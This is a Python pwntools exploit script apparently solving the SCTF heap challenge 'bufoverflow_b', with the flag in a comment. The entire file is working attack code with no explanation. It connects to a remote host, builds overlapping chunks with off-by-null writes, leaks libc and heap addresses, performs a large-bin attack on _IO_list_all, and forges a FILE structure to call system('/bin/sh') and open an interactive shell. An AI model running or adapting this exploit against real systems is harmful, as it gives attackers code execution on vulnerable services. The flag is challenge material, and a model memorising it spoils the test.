#!/usr/bin/env python
# coding: utf-8

from pwn import *

# flag : SCTF{7here_@re_s0m3_3rr0rs_7hen_wh47_wi11_u_do}

local = False

if local:
	p = process('./bufoverflow_b')
else:
	p = remote('116.62.152.176', 20002)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_local64 = {
	'base': 0x0,
	'system': 0x45390,
	'unsorted_bin': 0x3c4b78,
	'io_list_all': 0x3c5520,
	'io_str_jumps': 0x3c37a0
}

libc_remote = {
	'base': 0x0,
	'unsorted_bin': 0x399b58,
	'io_list_all': 0x39a500,
	'io_str_jumps': 0x3965c0,
	'system': 0x3f4b0
}

if local:
	libc = libc_remote
else:
	libc = libc_remote

heap = {
	'base': 0x0,
	'leaked': 0x420,
	'binsh': 0x30
}

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

def alloc(sz):
	ru('>> ')
	sel('1')
	ru('Size: ')
	sel(str(sz))

def fill(payload):
	ru('>> ')
	sel('3')
	ru('Content: ')
	se(payload)

def delete(idx):
	ru('>> ')
	sel('2')
	ru('Index: ')
	sel(str(idx))

def show():
	ru('>> ')
	sel('4')

def inject_zero(payload):
	if payload.endswith('\0'):
		payload = payload[:-1]
	while True:
		fill(payload.replace('\0', '\xAA') + '\0')
		if not '\0' in payload:
			break
		else:
			payload = payload[:payload.rfind('\0')]


alloc(0x400 - 8) # 0
alloc(0x4a0 - 8) # 1
alloc(0x420 - 8) # 2
alloc(0x100 - 8) # 3

delete(0)
delete(2)
alloc(0x420 - 8) # 0
fill('A' * (0x420 - 8))
inject_zero('A' * (0x420 - 16) + p64(0x400+0x4a0+0x420))

delete(3)

# overlap chunk

alloc(0x1000 - 8)
payload = 'A' * 0x3f8 + p64(0x4a1) + 'B' * 0x498 + p64(0x421) + 'C' * 0x418 + p64(0x21) + 'D' * 0x18 + p64(0x21)
inject_zero(payload)

# make mallopt to be zero, avoid cleaning on heap

delete(0)
delete(1)
alloc(0x1000 - 8) # 0

# leak libc

delete(2)
delete(0)

alloc(0x1000 - 8) # 0
show()

unsorted_bin = pick64(ru('\x7f'))
print('[+] unsorted bin @ %#x' % unsorted_bin)
set_base(libc, 'unsorted_bin', unsorted_bin)
print('[+] libc base @ %#x' % libc['base'])

delete(0)

# Large bin shoot - _IO_list_all
alloc(0x4a0 - 8) # 0
alloc(0x1000 - 8) # 1
payload = 'A' * 0x3f8 + p64(0x411) + 'B' * 0x408 + p64(0x91) + 'b' * 0x88 + p64(0x421) + 'C' * 0x8 + p64(0) + 'C' * 0x8 + p64(libc['io_list_all']-0x20) + 'C' * 0x3f8 + p64(0x21) + 'D' * 0x18 + p64(0x21)
assert not '\n' in payload
inject_zero(payload)

delete(0)
delete(1)

alloc(0x8a0 - 8) # 0
alloc(0x8a0 - 8) # 1

show()

# leak heap
leaked_heap = pick64(rud('\n1.'))
print('[+] leaked heap @ %#x' % leaked_heap)
set_base(heap, 'leaked', leaked_heap)
print('[+] heap base @ %#x' % heap['base'])

delete(1)
delete(0)

alloc(0x1000 - 8)

file_struct = p64(0) + p64(0) + p64(1) + p64(0) + p64(0) + p64(1) + p64(0) + p64(heap['binsh']) + p64(0)
file_struct = file_struct.ljust(0xd8, '\0') + p64(libc['io_str_jumps']-8) + p64(0) + p64(libc['system'])
payload = '/bin/sh\0'.ljust(0x3f0, 'A') + file_struct
inject_zero(payload)

alloc(1000)
p.interactive()
